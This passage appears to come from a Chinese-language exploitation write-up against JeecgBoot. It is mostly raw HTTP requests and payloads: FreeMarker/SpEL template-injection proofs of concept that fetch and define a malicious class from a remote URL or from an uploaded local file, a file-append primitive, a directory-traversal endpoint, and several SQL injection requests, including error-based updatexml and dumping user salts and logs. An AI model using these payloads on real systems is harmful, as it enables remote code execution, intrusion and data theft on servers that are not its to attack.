Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=UTF-8
X-Access-Token: null
token: null
JmReport-Tenant-Id: null
Content-Length: 167
Connection: close

{"dbSource":"","sql":"select 'payload'","tableName":"test_demo);","pageNo":1,"pageSize":10}
```

```
POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
Host: 
Content-Length: 97
Accept: application/json, text/plain, */*
tenant-id: 0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"sql":"select 'payload'"}
```

```
POST /jeecg-boot/sys/message/sysMessageTemplate/add HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Access-Token:
Content-Type: application/json
Content-Length: 712

{"id":"2222",
"templateCode":"2222","templateName":"1","templateContent":"payload",
"templateTestJson":"1",
"templateType":"1"
}
```

```
POST /jeecg-boot/sys/message/sysMessageTemplate/sendMsg HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/json
Content-Length: 69

{"msgType":"1",
"receiver":"2","templateCode":"2222","testData":"{}"
}
```

很多目标环境会对payload长度做限制或者数据库写入做几百的长度限制，如果我们加载字节码，就算gzip过后的payload长度也会上万了，通常会直接出网远程加载一个恶意类字节码。

常见利用POC

```
{"sql":"select '${"freemarker.template.utility.ObjectConstructor"?new()("org.springframework.expression.spel.standard.SpelExpressionParser").parseExpression("T(org.springframework.cglib.core.ReflectUtils).defineClass('ClassName',T(org.springframework.util.Base64Utils).decodeFromString(new java.util.Scanner(new java.net.URL('http://xxxxxxxx/1.txt').openStream(),'UTF-8').useDelimiter('\\
').next()),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()").getValue()}'"}
```

如果目标不出网另一种方式，jeecg-boot自带了一个文件上传，可以把恶意字节码落地到服务器上，缺点是服务器本地的端口未必和互联网端口一致，需要fuzz一下 127 的本地端口

```
/jeecg-boot/sys/common/upload
```

另一种本地加载的方式，如果知道上面 /jeecg-boot/sys/common/upload 接口上传的文件绝对路径可以直接本地加载

```
${"freemarker.template.utility.ObjectConstructor"?new()("org.springframework.expression.spel.standard.SpelExpressionParser").parseExpression("T(org.springframework.cglib.core.ReflectUtils).defineClass('ClassName',T(org.springframework.util.Base64Utils).decodeFromString(new java.lang.String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/tmp/11.txt')))),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()").getValue()}
```

如果没有上传接口，或者拿不到落地后文件的绝对路径，我们可以追加写入一个文件

```
${"freemarker.template.utility.ObjectConstructor"?new()("java.io.FileWriter","/tmp/111.txt",true).append("22222222").close()}
```

如果需要判断目标操作系统的类型可以通过常见的几个SQL注入漏洞报错，通过报错会回显出mapper的xml绝对路径；也可以通过修改js文件的大小写判断是否敏感，也可以通过下面接口直接目录遍历

```
/jeecg-boot/online/cgform/head/fileTree?parentPath=.
```

## SQL注入

网上公开的也很多了，这里只列举部分

```
/jeecg-boot/sys/api/getDictItems?dictCode=sys_user%20,username,salt
/jeecgboot/sys/dict/queryTableData?table=test_demo%20&pageSize=22&pageNo=1&text=name&code=sex
```

```
POST /jeecg-boot/jmreport/qurestSql HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host:
Content-Type: application/json
Content-Length: 126

{"apiSelectId":"1316997232402231298","id":"1' or '%1%' like (updatexml(0x3a,concat(1,(select database())),1)) or '%%' like '"}
```

```
POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64;rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=UTF-8
Content-Length: 56
Connection: close

{"sql":"select * from sys_log","dbSource":"","type":"0"}
```

```
POST /jeecg-boot/jmreport/loadTableData HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64;rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=UTF-8
Content-Length: 92

{"dbSource":"","sql":"select * from sys_log","tableName":"sys_log","pageNo":1,"pageSize":10}
```
